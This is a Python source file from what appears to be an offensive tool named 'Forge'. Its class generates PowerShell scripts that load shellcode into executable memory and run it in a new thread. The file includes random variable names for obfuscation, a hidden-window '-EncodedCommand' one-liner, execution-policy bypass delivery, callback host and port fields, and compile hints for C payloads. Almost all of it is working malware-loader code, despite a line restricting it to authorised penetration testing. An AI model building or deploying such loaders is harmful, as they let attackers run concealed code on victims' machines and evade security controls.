"""PowerShell Format Builder.

Generates a self-contained PowerShell script that:
  1. Decodes the base64-encoded shellcode
  2. Allocates executable memory (VirtualAlloc)
  3. Copies shellcode into it
  4. Spawns a thread (CreateThread) and waits

No compilation needed — delivered via:
  powershell.exe -EncodedCommand <base64>
  powershell.exe -ExecutionPolicy Bypass -File payload.ps1

FOR AUTHORIZED PENETRATION TESTING ONLY.
"""
from __future__ import annotations

import base64
import secrets
import textwrap


class Ps1Format:
    """PowerShell in-memory shellcode loader builder."""

    def build(
        self,
        shellcode: bytes,
        lhost: str = "",
        lport: int = 0,
        obfuscate: bool = True,
    ) -> bytes:
        """Return a complete .ps1 file as bytes."""
        if self._is_c_source(shellcode):
            # C source — wrap in a comment explaining how to compile and deliver
            return self._c_source_wrapper(shellcode, lhost, lport).encode()
        return self._shellcode_ps1(shellcode, lhost, lport, obfuscate).encode()

    def _is_c_source(self, data: bytes) -> bool:
        try:
            head = data[:64].decode("utf-8", errors="strict").lstrip()
            return head.startswith("/*") or head.startswith("#")
        except UnicodeDecodeError:
            return False

    def _shellcode_ps1(
        self, sc: bytes, lhost: str, lport: int, obfuscate: bool
    ) -> str:
        b64 = base64.b64encode(sc).decode()
        # Random var names when obfuscating
        if obfuscate:
            vsc  = "$" + secrets.token_hex(4)
            vmem = "$" + secrets.token_hex(4)
            vt   = "$" + secrets.token_hex(4)
        else:
            vsc, vmem, vt = "$sc", "$mem", "$t"

        delivery_hint = ""
        if lhost:
            delivery_hint = f"# Callback: {lhost}:{lport}\n"

        return textwrap.dedent(f"""\
        # Forge Payload — PowerShell In-Memory Shellcode Loader
        # FOR AUTHORIZED PENETRATION TESTING ONLY.
        {delivery_hint}
        {vsc} = [Convert]::FromBase64String('{b64}')

        $k32 = Add-Type -MemberDefinition @'
            [DllImport("kernel32.dll")]
            public static extern IntPtr VirtualAlloc(
                IntPtr lpAddr, UIntPtr size, uint alloc, uint prot);
            [DllImport("kernel32.dll")]
            public static extern bool VirtualProtect(
                IntPtr lpAddr, UIntPtr size, uint newProt, out uint oldProt);
            [DllImport("kernel32.dll")]
            public static extern IntPtr CreateThread(
                IntPtr lpAttr, UIntPtr stackSize, IntPtr startAddr,
                IntPtr param, uint flags, IntPtr threadId);
            [DllImport("kernel32.dll")]
            public static extern uint WaitForSingleObject(IntPtr hObj, uint ms);
        '@ -Name 'K{secrets.token_hex(3)}' -Namespace 'Forge' -PassThru

        {vmem} = $k32::VirtualAlloc([IntPtr]::Zero, [UIntPtr]{vsc}.Length, 0x3000, 0x04)
        [System.Runtime.InteropServices.Marshal]::Copy({vsc}, 0, {vmem}, {vsc}.Length)
        [uint32]$_old = 0
        $k32::VirtualProtect({vmem}, [UIntPtr]{vsc}.Length, 0x20, [ref]$_old) | Out-Null
        {vt} = $k32::CreateThread([IntPtr]::Zero, [UIntPtr]::Zero, {vmem},
                                   [IntPtr]::Zero, 0, [IntPtr]::Zero)
        $k32::WaitForSingleObject({vt}, 0xFFFFFFFF) | Out-Null
        """)

    def _c_source_wrapper(self, sc: bytes, lhost: str, lport: int) -> str:
        """When payload is C source, provide PS1 that invokes a temp compiler."""
        src = sc.decode(errors="replace")
        b64_src = base64.b64encode(sc).decode()
        return textwrap.dedent(f"""\
        # Forge Payload — PowerShell C-Source Wrapper
        # The inner payload is C source that requires compilation.
        # FOR AUTHORIZED PENETRATION TESTING ONLY.
        #
        # Option 1: Save the C source below and compile manually:
        #   x86_64-w64-mingw32-gcc -o payload.exe loader.c -lws2_32 -s -O2 -mwindows
        #
        # Option 2: Use Invoke-Expression with cl.exe if MSVC is available.
        #
        # Embedded C source (base64):
        # {b64_src}
        Write-Host '  [!] C source payload — compile before delivery'
        Write-Host '  [*] See embedded base64 above for the source'
        """)

    def encoded_command(self, shellcode: bytes, **kwargs) -> str:
        """Return a powershell.exe -EncodedCommand one-liner for this payload."""
        ps1 = self._shellcode_ps1(shellcode, **kwargs)
        b64 = base64.b64encode(ps1.encode("utf-16-le")).decode()
        return f"powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand {b64}"
